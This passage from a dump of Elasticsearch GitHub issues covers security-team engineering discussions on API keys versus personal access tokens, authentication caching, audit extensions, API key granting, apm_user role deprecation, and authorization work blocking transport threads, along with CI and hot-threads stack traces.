The problem for Kibana API is that API keys work in most of the cases, but not for tasks requiring the creation of other API keys (e.g. Alerting) because an API key cannot create another API key. This is a technical constraint that affects users in any realm.

If there is an urgency to allow programmatic access to all Kibana API, this could be addressed independently and PAT may or may not be the right answer.Thank you for the detailed response, @bytebilly. Do you mind checking my understanding?

We will continue to recommend that users create API keys to access both ES and Kibana HTTP APIs, for example in Cloud.

These API Keys will not work for programmatic access to Kibana HTTP APIs that should only be used by people because we should be using personal access tokens for this.

Additionally, these API Keys will not work for programmatic access to Kibana HTTP APIs that internally create API Keys because API Keys can't create API Keys. This is potentially a separate problem from what would be solved by personal access tokens.> We will continue to recommend that users create API keys to access both ES and Kibana HTTP APIs, for example in Cloud.

👍 

> These API Keys will not work for programmatic access to Kibana HTTP APIs that should only be used by people because we should be using personal access tokens for this.

I'm not sure that they will not work. But there will be limitations in some cases.

> Additionally, these API Keys will not work for programmatic access to Kibana HTTP APIs that internally create API Keys because API Keys can't create API Keys. This is potentially a separate problem from what would be solved by personal access tokens.

👍 Thank you for correcting my prior thinking, @bytebilly, I'll update the issue description accordingly as the situation is not as dire as I feared.> The Kibana and Elasticsearch security teams posit that an API Key is not a user, and that an API Key is not necessarily under the control of the user that created it. In other words, these are not designed to be used as ""personal access tokens"".

The last part of that description might be a bit of over-editorialisation.

Given the range of ways in which ES API Keys are used today, it is definitely **not safe** to treat an API Key as _being_ the user that owns it. For example
- Fleet enrollment keys _are not_ PATs for the individual that created the fleet policy. We should definitely not allow an enrollment key to act on that user's Kibana preferences.
- An API Key used for Kibana Alerting is closer to being a PAT, but it's still not ""the user"". For example, we should not update the user's ""last login time"" every time an alerting job runs.

Whether API keys are _designed to be used as ""personal access tokens""_ probably depends on what definition we want to use for a PAT. Our view is that it's perfectly fine for them to be used as PATs if their behaviour fits the needs of the people who want to use them.  
However it's definitely not fine for Elastic products to assume that an API Key owned by `user1` is functionally equivalent to a user authenticating as `user1`. Questions about access to personal preferences, notifications, etc require a more in-depth consideration than simply being based on the user-id.
 > Whether API keys are designed to be used as ""personal access tokens"" probably depends on what definition we want to use for a PAT. Our view is that it's perfectly fine for them to be used as PATs if their behaviour fits the needs of the people who want to use them.
> However it's definitely not fine for Elastic products to assume that an API Key owned by user1 is functionally equivalent to a user authenticating as user1. Questions about access to personal preferences, notifications, etc require a more in-depth consideration than simply being based on the user-id.

To be honest, this is what concerns me. API Keys don't currently work well for Kibana HTTP APIs. We already have the issue that API Keys can't be used to create alerting rules because API Keys can't create API Keys. @bytebilly has brought up that the solution to this problem potentially isn't personal access tokens, so I'm happy to discuss this complication elsewhere.

And while I totally get that it's not fine for Elastic products to assume that an API Key owned by `user1` is functionally equivalent to a user authenticating as `user1` in all situations, I'm almost certain some people will want for it to behave this way in some situations. Particularly because we're recommending that they create API Keys to interact with Kibana HTTP APIs when they've authenticated using SSO. If the solution to this is Personal Access Tokens, we will need them sooner rather than later.
",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,627325717,"Negative cache for `FileUserPasswdStore` and `NativeUsersStore`","The `CachingUsernamePasswordRealm` only caches positive results (i.e. authentication successful). If an inbound credential misses the positive cache, it falls back to realm validation.
Negative authentication results are impossible to cache at this level because a password that is not valid at one moment, could be valid the next.

Yet I believe we can implement a negative cache at the user store level. The user store is backing native and file realms. This negative cache would save validating the same wrong password multiple times, saving cycles on password hash computation.
","Pinging @elastic/es-security (:Security/Authentication)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1193217642,"[CI] LicenseInstallationIT testInstallLicense failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/2ocludjq4tf42/tests/:x-pack:plugin:data-streams:qa:multi-node:javaRestTest/org.elasticsearch.xpack.core.LicenseInstallationIT/testInstallLicense

**Reproduction line:**
`./gradlew ':x-pack:plugin:data-streams:qa:multi-node:javaRestTest' --tests ""org.elasticsearch.xpack.core.LicenseInstallationIT.testInstallLicense"" -Dtests.seed=CB2A6BB0E7B20A4D -Dbuild.snapshot=false -Dtests.jvm.argline=""-Dbuild.snapshot=false"" -Dtests.locale=sr-Latn -Dtests.timezone=Atlantic/Jan_Mayen -Druntime.java=8`

**Applicable branches:**
7.17

**Reproduces locally?:**
Yes

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.core.LicenseInstallationIT&tests.test=testInstallLicense

**Failure excerpt:**
```
java.lang.AssertionError: 
Expected: ""enterprise""
     but: was ""platinum""

  at __randomizedtesting.SeedInfo.seed([CB2A6BB0E7B20A4D:DACDCC2F94001591]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.junit.Assert.assertThat(Assert.java:923)
  at org.elasticsearch.xpack.core.LicenseInstallationIT.testInstallLicense(LicenseInstallationIT.java:84)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:498)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at java.lang.Thread.run(Thread.java:748)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/License,Team:Security,"
elastic/elasticsearch,317449254,"User defined audit messages via extensions","*Original comment by @jaymode:*

Some users have specific requirements to audit changes to document security labels or other sensitive information, which is not something we currently provide access to. There is a possibility to create an extension point where the request could be passed off to an audit implementation that can generate its own messages.

Some things that need to be more fleshed out are what would this extension point look like and would this be an audit output or would we introduce a audit event that could be returned and output by the audit trails?


",,no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,841576842,"Consolidate the authentication result caches","As discussed over a [comment](https://github.com/elastic/elasticsearch/pull/70543#discussion_r598085528) of #70543, there is an opportunity to consolidate existing caches used for authentication results. These are the one used for `CachingUsernamePasswordRealm`, `ApiKeyService` and `CachingServiceAccountsTokenStore`. Their implementations are largely identical. The different authentication result can be generialised. We should be able to have a common implementation for all of them. We could also consider using composition over inheritance when we are at it.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,819876129,"Support sharing creator's privileges when granting an API key ","The [Grant API key API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-grant-api-key.html) allows UserA to grant an API key to UserB. The API key is always created using UserB's privileges as the limiting scope. Because of this, this API requires UserB's credentials to work. 

There are however cases where it makes sense for the key to be created with UserA's privileges and thus avoid having to require UserB's credentials. Even if the key can only be created with no privilege, it can still be used for authentication (enrollment). This is similar but has subtle and important difference from ""UserA directly creating the key"" (instead of granting the key):
1. The key's owner will be UserB which has importance in terms of auditing and ingestion pipeline
2. UserB is able to manage this key (assuming UserB has `manage_own_api_key` privilege)
3. UserA is also able to manage this key (this assumes #69777)
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1271458561,"Mark `apm_user` for removal in 9.0","Meta issue: https://github.com/elastic/kibana/issues/116760
The `apm_user` role was [marked as deprecated](https://github.com/elastic/elasticsearch/pull/68749) in 7.13 and was supposed to be removed in 8.0 but it didn't happen. Now we are aiming to remove the role in 9.0 and are updating the deprecation message.

All mentions of `apm_user` role have been removed from docs and in-product mentions in https://github.com/elastic/kibana/pull/132790. ","Pinging @elastic/es-security (Team:Security)Hi @sqren, I've created a changelog YAML for you. *Note* that since this PR is labelled `>deprecation`, you need to update the changelog YAML to fill out the extended information sections.> I think we should use `the next major release` instead of `9.0` since the major release strategy is not entirely clear.

We could be even more generic with ""a future major release"". It was not so uncommon that we decided to keep a deprecated feature across majors, and in that case the message may be confusing.I changed the deprecation notice to ""This role will be removed in a future major release. Please use editor and viewer roles instead""@elasticmachine update branch@pugnascotia CI fails for this PR because it does not like the area label of deprecation. Existing ones are

https://github.com/elastic/elasticsearch/blob/fc09896ec63393caee7beace584eba49664bb8d0/build-tools-internal/src/main/resources/changelog-schema.json#L177-L191

But none of them seems to fit the deprecation here which is for a builtin role. What would be your recommendation? Thanks!It's fine to add a new area to that last. Obviously we don't want lots and lots of areas, but if we need a another one then let's just add it. ""Authorization"" or ""Security"" would be OK, something like that.",yes,">deprecation,:Security/Authorization,Team:Security,external-contributor,v8.6.0,"
elastic/elasticsearch,794373694,"Stop Security's heavy authz and audit harming the cluster's stability","Security's authz and audit (but, usually, not authn) work that kicks off in `SecurityRestFilter#handleRequest` and `SecurityServerTransportInterceptor$ProfileSecuredRequestHandler#messageReceived` takes place on the same invoking thread (although, interestingly, the `AuthorizationEngine` interface is async). 
Given the networking threading model, this can become a problem. All the TCP connections between the nodes are divvied among the `transport_worker` threads statically, i.e. in nett4 terminology, a `TransportChannel` is always managed by the same `EventLoop`, and an `EventLoop` is always executed by the same thread.

This means that a given `transport_worker` thread that is busy doing auditing (eg rotating the logfile, or auditing [bulk ingest](https://github.com/elastic/elasticsearch/issues/39658)) and authorization (building the [authorized indices list](https://github.com/elastic/elasticsearch/blob/ad1f876daa714001877622ae4d6c91043c38eae7/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/AuthorizationService.java#L282)) is prevented to check on the other connections (do a select on the assigned channels), and if one of those channels is the `ping` to the master, the node is risking being kicked out.

I think we should investigate **making Security async** (configurable so). I think, but we need to test and quantify it, that the characteristically deep stacks of Security go against the thread locality benefits that a typically concise rest/transport handler provides. Authz can probably be optimized, but auditing involves disk IO and it's generally bad practice to have blocking APIs on the network threads. It's worth mentioning that some `HandledTransportAction`s are already registered to execute on designated thread pools (i.e., `ServerTransportFilter$NodeProfile#inbound` might run on other thread pools, eg refresh, but `SecurityRestFilter` and `SecurityActionFilter` _always_ run on `transport_worker` threads). 

Another option that I see is to separate the important channels (`ping`, `state`, and `recovery`) over dedicated event loops, so that no event loop thread multiplexes between regular handlers and these important handlers (similar to how there are separate event loop groups for http and inter-node). WDYT @tbrooks8 ?

Related https://github.com/elastic/elasticsearch/issues/39658 https://github.com/elastic/elasticsearch/issues/67987

<details>
<summary> Here's an assortment of stack traces from a hot threads output, that I've based my analysis on:</summary>
```
    0.3% (1.4ms out of 500ms) cpu usage by thread 'elasticsearch[d592dd1cbcb53b0ebb1f25e4ad18e487d592dd1][transport_worker][T#3]'
     unique snapshot
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group.lambda$buildIndexMatcherPredicateForAction$0(IndicesPermission.java:453)
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group$$Lambda$5071/0x00000008017e9720.test(Unknown Source)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:520)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5057/0x00000008018004b8.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5058/0x00000008018006e0.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5061/0x0000000801800d78.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4825/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4827/0x00000008017d04a0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4721/0x0000000801604bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4723/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4724/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.InboundHandler$RequestHandler.doRun(InboundHandler.java:263)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.transport.InboundHandler.handleRequest(InboundHandler.java:176)
       app//org.elasticsearch.transport.InboundHandler.messageReceived(InboundHandler.java:93)
       app//org.elasticsearch.transport.InboundHandler.inboundMessage(InboundHandler.java:78)
       app//org.elasticsearch.transport.TcpTransport.inboundMessage(TcpTransport.java:692)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler$$Lambda$4590/0x00000008016ccf08.accept(Unknown Source)
       app//org.elasticsearch.transport.InboundPipeline.forwardFragments(InboundPipeline.java:142)
       app//org.elasticsearch.transport.InboundPipeline.doHandleBytes(InboundPipeline.java:117)
       app//org.elasticsearch.transport.InboundPipeline.handleBytes(InboundPipeline.java:82)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler.channelRead(Netty4MessageChannelHandler.java:76)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.logging.LoggingHandler.channelRead(LoggingHandler.java:271)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)


    0.3% (1.7ms out of 500ms) cpu usage by thread 'elasticsearch[85e0323f2e3b30a0ac2c568f8236fe6a85e0323][transport_worker][T#9]'
     unique snapshot
       java.base@15/java.util.HashMap$HashIterator.nextNode(HashMap.java:1588)
       java.base@15/java.util.HashMap$EntryIterator.next(HashMap.java:1617)
       java.base@15/java.util.HashMap$EntryIterator.next(HashMap.java:1615)
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission.authorize(IndicesPermission.java:320)
       org.elasticsearch.xpack.core.security.authz.permission.Role.authorize(Role.java:173)
       org.elasticsearch.xpack.security.authz.RBACEngine.buildIndicesAccessControl(RBACEngine.java:540)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$3(RBACEngine.java:321)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5083/0x0000000801839850.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5087/0x000000080183a110.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.resolveIndexNames(AuthorizationService.java:579)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$6(AuthorizationService.java:273)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5091/0x000000080183abf8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5087/0x000000080183a110.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5073/0x0000000801838270.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5074/0x0000000801838498.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5079/0x0000000801838f90.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4876/0x0000000801617af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4878/0x00000008017e0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4776/0x0000000801614bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4778/0x0000000801615bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4779/0x0000000801615df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.InboundHandler$RequestHandler.doRun(InboundHandler.java:263)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.transport.InboundHandler.handleRequest(InboundHandler.java:176)
       app//org.elasticsearch.transport.InboundHandler.messageReceived(InboundHandler.java:93)
       app//org.elasticsearch.transport.InboundHandler.inboundMessage(InboundHandler.java:78)
       app//org.elasticsearch.transport.TcpTransport.inboundMessage(TcpTransport.java:692)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler$$Lambda$4628/0x00000008016e4f08.accept(Unknown Source)
       app//org.elasticsearch.transport.InboundPipeline.forwardFragments(InboundPipeline.java:142)
       app//org.elasticsearch.transport.InboundPipeline.doHandleBytes(InboundPipeline.java:117)
       app//org.elasticsearch.transport.InboundPipeline.handleBytes(InboundPipeline.java:82)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler.channelRead(Netty4MessageChannelHandler.java:76)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.logging.LoggingHandler.channelRead(LoggingHandler.java:271)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
